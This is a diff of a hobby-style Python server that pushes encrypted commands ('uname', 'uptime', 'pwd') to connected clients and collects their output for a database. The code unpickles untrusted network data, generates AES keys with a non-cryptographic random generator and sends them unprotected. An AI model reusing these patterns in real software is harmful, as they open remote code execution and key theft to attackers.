@@ -9,10 +9,9 @@ import mysql.connector as mysql
 
 #||||||||||||||||||||||||||||||SERVER||||||||||||||||||||||||||
 
+
 #TODO
-#   1.  Change the result dict to --> who : [{command : result}, {command : result}]
-#   PROBLEM --> The server receives the results as b' command : result. Gotta figure out a way
-#               to cast the command to a string-object, now it's a byte object line 90
+#   1.  Maybe do something with checksums
 
 
 HVA = '145.109.151.121'
@@ -22,12 +21,10 @@ serverAddress = l, 1111
 s.bind(serverAddress)
 s.listen(1)
 
-socketDict = {} # who : conn
-commandList = ['uname', 'uptime']
+socketDict = {} # who : [conn, [key1, key2]]
+commandList = ['uname', 'uptime', 'pwd']
 global resultDict
-resultDict = {} #Holds who : [results] 
-global key
-key = []
+resultDict = {} #Holds who : [{COMMAND : RESULT}] 
 
 
 def encryptAES(message, key, key2):
@@ -41,13 +38,14 @@ def decryptAES(ciphertext, key, key2):
     message = obj2.decrypt(ciphertext)
     return message
 
-#   --> Generates a key based on a given keySize.
+#   --> Generates a list of 2 keys based on a given keySize (Default 16).
+#       All ASCII printable symbols
 def generateKeys(keySize):
     key = []
     for i in range(0, 2):
         x = ""
         for j in range(keySize):
-            x += chr(int(random.randrange(65, 90))) #Capitals only for now
+            x += chr(int(random.randrange(33, 126))) #Character set, check ASCII if you're curious
         key.append(x)
     return key
 
@@ -61,7 +59,7 @@ def connHandler(socket, x):
             who = pickle.loads(conn.recv(2048))
             socketDict.update({who : [conn, key]}) #store key
             conn.send(pickle.dumps(key)) #send key
-            resultDict.update({who : []}) #For every new conn, initialize it with who : [results]
+            resultDict.update({who : []}) #For every new conn, initialize it with who : []
         except Exception as e:
             print(e)
 
@@ -70,21 +68,20 @@ def sendCommands():
     for key in socketDict.keys(): #For each key,
         for command in commandList: #Send a command, try and receive a response, for every command
             try:
-                command = encryptAES(command, socketDict[key][1][0], socketDict[key][1][1])
-                command = pickle.dumps(command)
-                socketDict[key][0].send(command)
-                #socketDict[key][0].send(pickle.dumps(encryptAES(command, socketDict[key][1][0], socketDict[key][1][1]))) #ONELINER :-)
-                receive(key)
+                command = encryptAES(command, socketDict[key][1][0], socketDict[key][1][1]) #encrypt
+                command = pickle.dumps(command) #Serialize
+                socketDict[key][0].send(command) #Send that shit
+                receive(key) #We're gonna expect a response, call for a receive with the WHO
             except Exception as e:
                 print(e)
 
-    print("results: ",resultDict)
     print("connections: ",socketDict)
- 
+
+
 #   --> Receives something from a socket, key is the key in socketDict.
 #       socketDict[key][0] is a socket, [1][0] and [1][1] are keys
+#       x ought to be a dictionairy {COMMAND : RESULT}
 def receive(key):
-    #pdb.set_trace()
     try:
         x = socketDict[key][0].recv(2048)
         x = decryptAES(x, socketDict[key][1][0], socketDict[key][1][1]) #Decrypt
@@ -92,7 +89,6 @@ def receive(key):
         resultDict[key].append(x) #store the result for said connection in resultDict
     except Exception as e:
         print(e)
-        time.sleep(100)
 
 #   --> try to connect to the database
 def connDatabase(resultDict):
